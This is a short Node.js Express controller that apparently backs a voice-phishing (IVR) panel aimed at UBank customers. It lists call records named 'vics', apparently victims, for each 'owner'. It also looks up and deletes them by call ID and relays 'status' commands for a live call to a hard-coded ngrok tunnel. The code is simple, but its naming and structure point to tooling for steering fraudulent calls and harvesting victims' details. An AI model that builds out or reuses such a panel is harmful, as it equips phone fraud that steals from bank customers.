const ubankIVR = require("../models/ubankIVRModel");
var axios = require("axios");
var qs = require("qs");

const getOwnerVics = async (req, res) => {
  const { owner } = req.params;
  ubankIVR
    .find({ owner })
    .sort({ status: -1 })
    .exec((err, vics) => {
      if (err) {
        console.log(err);
        res.status(404).send("Error");
        return;
      }
      res.send(vics);
    });
};

const getInfo = async (req, res) => {
  const { CallSid } = req.params;
  ubankIVR.findOne({ CallSid }).exec((err, vic) => {
    if (err) {
      console.log(err);
      res.status(404).send("Error");
      return;
    }
    res.send(vic);
  });
};

const deleteEntry = async (req, res) => {
  const { uniqueid } = req.body;
  try {
    await ubankIVR.deleteOne({ CallSid: uniqueid });
    res.sendStatus(200);
  } catch (error) {
    console.log(error);
    res.sendStatus(400);
  }
};

const command = async (req, res) => {
  const { CallSid, status } = req.body;
  var data = qs.stringify({
    CallSid,
    status,
  });
  var config = {
    method: "post",
    url: "https://748c-82-117-137-37.eu.ngrok.io/command",
    headers: {
      "Content-Type": "application/x-www-form-urlencoded",
    },
    data: data,
  };

  axios(config)
    .then(function (response) {
      res.sendStatus(200);
    })
    .catch(function (error) {
      console.log(error);
      res.sendStatus(303);
    });
};

module.exports = {
  getInfo,
  deleteEntry,
  getOwnerVics,
  command,
};
